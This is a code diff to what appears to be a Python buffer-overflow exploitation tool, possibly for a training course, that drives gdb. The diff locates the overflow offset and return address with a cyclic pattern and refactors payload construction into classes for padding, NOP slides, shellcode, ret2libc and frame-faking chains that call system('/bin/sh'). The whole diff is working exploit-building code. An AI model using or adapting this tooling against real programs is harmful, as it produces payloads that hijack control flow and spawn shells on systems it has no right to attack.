@@ -34,7 +34,7 @@ from .init import LevelFormatter, red, cyan
 from .utils import select_target
 from .repl import redisplay
 from .exploit import (
-    plain, nop_slide, ret_to_func, frame_faking, mprotect)
+    Payload, Fill, Plain, Nop, Shellcode, Ret2Fun, Faked, mprotect)
 from .utils import pause
 
 
@@ -42,6 +42,7 @@ pat = Pat()
 
 
 def main(course, bits, burst, level):
+    Payload.bits = bits
     logger = logging.getLogger()
     handler = logging.StreamHandler(stderr)
     handler.setFormatter(LevelFormatter())
@@ -76,20 +77,24 @@ def get_offset(target, name, bits, burst, course):
     gdb.execute('start {}'.format(name))
     sp = '$esp' if bits == 32 else '$rsp'
     ip = '$eip' if bits == 32 else '$rip'
+    wide = '32wx' if bits == 32 else '16gx'
     last_stack = ''
     while True:
         try:
-            cur_sp = gdb.execute('p {}'.format(sp), to_string=True)
-            cur_stack = gdb.execute('x/32wx {}'.format(sp),
+            cur_stack = gdb.execute('x/{} {}'.format(wide, sp),
                                  to_string=True)
             last_stack = cur_stack
         except gdb.error as error:
             if bits == 64:
+                gdb.execute('file {}'.format(target))
+                gdb.execute('start {}'.format(name))
                 logging.error(last_stack)
                 pattern = last_stack.split()[1]
                 offset = pat.locate(pattern)
                 addr = last_stack.split(':')[0]
+                logging.info('addr: %s', addr)
                 addr = hex(int(addr, 16) + 8)
+                addr = '{:#018x}'.format(int(addr, 16))
                 logging.info('pattern: %s offset: %s addr: %s',
                              pattern, offset, addr)
                 return offset, addr
@@ -136,15 +141,18 @@ def init():
 
 # TODO: Make it a class.
 def make_payload(offset, addr, post, bits):
-    fill = b'A' * offset
     if post == 'plain':
-        payload = fill + plain(addr, bits)
+        payload = Fill(offset) + Plain(addr) + Shellcode()
     elif post == 'nop-slide':
-        payload = fill + nop_slide(addr)
+        payload = Fill(offset) + Plain(addr) + Nop(32) + Shellcode()
     elif post == 'ret2lib':
-        payload = fill + ret_to_func()
+        payload = Fill(offset) + Ret2Fun()
     elif post == 'frame-faking':
-        payload = frame_faking(offset, addr)
+        payload = (
+            Faked(offset=offset, address=addr) +
+            Faked('system', ['/bin/sh']) +
+            Faked('system', ['/bin/sh']) +
+            Faked('exit', [0]))
     elif post == 'mprotect':
         payload = mprotect(offset, addr)
-    return payload
+    return payload.payload
